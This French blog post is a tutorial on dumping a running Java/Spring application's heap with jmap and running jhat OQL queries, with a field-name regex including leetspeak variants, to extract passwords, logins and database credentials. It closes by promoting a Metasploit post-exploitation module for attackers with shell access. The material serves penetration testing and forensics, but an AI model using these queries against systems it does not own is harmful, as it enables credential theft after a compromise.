---
title: Extraire les mots de passes et autres informations depuis un heapdump Java
date: 2017-03-23
layout: Post
# hero credit : https://images.unsplash.com/photo-1443556858920-132511e53739
hero: /assets/java-heapdump-extractor.jpg
---

À travers cet article, nous allons voir comment nous pouvons extraire des
informations (pour le moins intéressantes) depuis une empreinte mémoire d'une
application Java.

> Si vous disposez déjà d’une empreinte mémoire, vous pouvez aller directement
à la [seconde partie](#seconde-partie--extraction-des-donn%C3%A9es-int%C3%A9ressantes).

> Pour réaliser ces manipulations, vous aurez besoin du **JDK**.
Nous supposons ainsi que les outils _jps_, _jmap_, _jhat_ du JDK sont
accessibles en ligne de commande.

***

## Première partie : Prélèvement de l’empreinte mémoire

### 0. Lancement de l'application
Pour cet exemple, nous allons prendre le cas d’une application Spring.

L’application est lancée avec un fichier de configuration
_application.properties_ à partir d’un _snapshot.jar_
```cmd
java -jar snapshot.jar --spring.config.location=src/main/resources/conf/application.properties
```
### 1. Récupération du PID
Dans notre cas, Spring Boot nous affiche directement le PID, mais dans le
cas général nous pouvons nous servir de l’utilitaire _jps_ contenu dans le jdk.
```cmd
jps -mlv
```
Nous obtenons la liste des processus s'exécutant dans la JVM.

Jps propose les options suivantes :
* -m : Affiche les arguments du processus
* -l : La localisation complète
* -v : Les arguments ajoutées à la JVM
* -q : Seulement les PID

### 2. Prise de l'empreinte mémoire
Maintenant que nous avons le PID du processus, nous allons pouvoir réaliser
un 'live dump' grâce à l’utilitaire _jmap_
```cmd
jmap -dump:live,format=b,file=/tmp/heap.dump 1337
```
* **_1337_** est a remplacer par votre PID
* **_/tmp/heap.dump_** est le chemin et le nom de fichier qui sera créée
(l’extension est au choix, ainsi que le répertoire de destination
et le nom du fichier)

> **Attention, la taille de votre empreinte mémoire dépend de votre application
et peut être très (très) volumineuse !**

***

## Seconde partie : Extraction des données intéressantes

Bien, maintenant que nous disposons d’un fichier d’empreinte, nous allons
pouvoir commencer à extraire les informations croustillantes !

Pour cela nous allons nous appuyer sur l’utilitaire _jhat_ qui va nous
permettre de lire le dump mémoire et qui nous propose d’exécuter des requêtes
OQL (Object Query Language) afin de récuperer des objets en particulier

```cmd
jhat -port 7401 -J-Xmx4G /tmp/heap.dump
```
* le port **_7401_** sera le port où le service web de jhat tournera
(choisissez un port de disponible :)
* **_/tmp/heap.dump_** est le chemin vers le fichier d'empreinte mémoire

À présent vous pouvez vous rendre sur http://localhost:7401/ pour apercevoir
une liste de toutes les classes Java de votre application.

Mais ce n’est pas ce qui nous intéresse, la partie intéressante se trouve sur
la page http://localhost:7401/oql/

Cette page permet d’exécuter des requêtes OQL pour extraire ce qui nous intéresse.
___
### 1.	Le cas d’une application Spring

Dans notre exemple, nous avons pris le cas d’une application Spring avec un
fichier de configuration _application.properties_

Voici le contenu de notre fichier :
```x
# Database Configuration
datasource.driver = org.postgresql.Driver
datasource.url = jdbc:postgresql://localhost:1234/test
datasource.username = postgresUSERNAME
datasource.password = postgresPASSWORD

# Security
management.security.enabled: true
security.basic.enabled: true
security.user.login = this_is_the_user_login
security.user.password = this_is_the_user_password
security.admin.login = this_is_the_admin_login
security.admin.password = this_is_the_admin_password

endpoints.enabled: false

endpoints.shutdown.id: shutdown
endpoints.shutdown.sensitive: true
endpoints.shutdown.enabled: true

endpoints.health.id: health
endpoints.health.sensitive: false
endpoints.health.enabled: true

# File max size
spring.http.multipart.max-file-size=5MB
```

#### Comment ces données sont gérées ?

##### Version courte

Ces données sont stockées sous forme de _String_ dans une classe
_org.springframework.core.env.PropertiesPropertySource_

##### Version complète

Voici un schéma de qualité :

![schéma tout moche](/assets/java-heapdump-extractor(1).png)

#### Comment je peux les extraire de mon dump ?

Pas de panique, voici la requête pour extraire les informations :
```js
select
 filter(
  map(pps.source.table,
    function(it) {
      if(it != null)
        return it.key.toString() + ' = ' + it.value.toString();
    }
  ),
  "it != null"
 )
from org.springframework.core.env.PropertiesPropertySource pps
```

Et le lien _ready to eat_ : <http://localhost:7401/oql/?query=select+filter%28map%28pps.source.table%2Cfunction%28it%29%7Bif%28it%21%3Dnull%29return+it.key.toString%28%29%2B%27+%3D+%27%2Bit.value.toString%28%29%3B%7D%29%2C%22it%21%3Dnull%22%29+from+org.springframework.core.env.PropertiesPropertySource+pps>

![résultat](/assets/java-heapdump-extractor(4).png)

#### Je veux comprendre la requête !
> Comme vous l’avez vu sur le schéma de qualité, la classe
_PropertiesPropertySource_ posséde un champ _source_ possédant un champ
_table_ que nous parcourons grâce à la fonction _map_
(cette fonction permet d'effectuer une action _function(it)_ sur chaque objet
contenu dans l’objet en paramètre)

> La fonction filter nous sert à éliminer les champs vides

___
### 2. Le cas général

Dans le cas d'une application quelconque (Spring inclus),
nous souhaitons extraire des champs du type _password_ et autre.

Pour cela, voici la requête qui récupère tous les champs intéressants :

```js
select filter(map(
  map(filter(heap.classes(), function(it) {
    var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/;

    for(field in it.fields)     
      if(interests.test(it.fields[field].name.toLowerCase())) return true;

    return false;
  }), "heap.objects(it, true)"), function(it) {
    var res = "";
    var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/;

    while (it.hasMoreElements()) {
      it = it.nextElement();
      for(field in it) {
        if(interests.test(field.toLowerCase())) {
          if(res !== '')
            res += ', ';
          res += field + ' : ' + (it[field] ? (it[field].value ?
              it[field].value.toString() : it[field].toString()) : it[field]);
        }
      }
    }
    return res;
  }), "it");
```
Et le résultat :
![résultat](/assets/java-heapdump-extractor(2).png)

#### C'est génial ! Mais comment ça marche ?

Dans notre petite application Spring, nous avions 347000 objets (= instances)
dans notre dump. Faire un tri sur les objets est donc tout juste impossible.

La solution consiste à récupérer toutes les classes disponibles et de trier
celles comportant des attributs du type :

_Login, password, username, database, credential…_

> Vous retrouverez ces mots clefs dans une _expression régulière_ que vous
pouvez bien sûr personnaliser !
(Attention, vous pouvez vite vous retrouver avec beaucoup trop d’objets !)

Enfin, on récupère toutes les instances de ces classes, en n’affichant que les
champs que l’on trouve intéressants

___
### 3. Les mots de passes sont dans des champs _static_ comment je fais ?

Pas de soucis, voici une requête qui fera le _taf_
```js
select filter(
  map(filter(heap.classes(), "it.statics"),
    function(it) {
      var res = '';
      var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/;
      for (field in it.statics) {
        if(interests.test(field.toLowerCase())) {
          if(res !== '')
            res += ', ';
          res += field + ' : ' + it.statics[field].toString();
        }
      }
      return res;
    }
  ), "it");
```
> Pas de secrets, on récupère les classes avec des champs statics, et on trie
celles avec des noms de champs intéressants !  

![résultat](/assets/java-heapdump-extractor(3).png)
___
## Partie bonus : Metasploit Post Module

Vous avez un accès à un shell avec le JDK d’installé et une application java qui tourne ?

Voici le module qui fera tout cela pour vous !

[![asciicast](https://asciinema.org/a/108492.png)](https://asciinema.org/a/108492?speed=2.5)

___

> ** Merci d’avoir lu cet article ! N'hésitez pas à soumettre vos suggestions 
dans les commentaires ;)**
